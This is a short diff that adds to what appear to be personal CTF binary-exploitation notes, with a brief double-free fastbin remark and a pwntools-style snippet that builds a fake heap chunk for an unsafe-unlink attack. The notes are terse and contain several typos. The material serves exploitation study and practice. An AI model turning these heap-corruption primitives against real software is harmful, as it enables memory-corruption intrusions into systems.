@@ -486,3 +486,23 @@ Hence, if we make `pathname` point to `"/bin/sh"`, and set `argv`, `envp` and `f
 ```c
 clang -fstack-protector -fpie -pie -s -Wl,-z,relro,-z,now  test.c -o test
 ```
+
+### double-free
+end of fastbin. control point and malloc arbitrarily to control_point with **suitable size**.
+
+### unsortbin
+* one of by: fake chuck - unlink () 
+```array       = 0x602108
+fd          = array - (3*8)
+bk          = array - (2*8)
+
+fake_chunk  = p64(0)
+fake_chunk += p64(0x8)
+fake_chunk += p64(fd)
+fake_chunk += p64(bk)
+fake_chunk += 'A'*0x60
+fake_chunk += p64(0x80)		# size previe
+fake_chunk += p8(0x90)      # before chuck is free
+
+edit(fake_chunk, 9)
+```
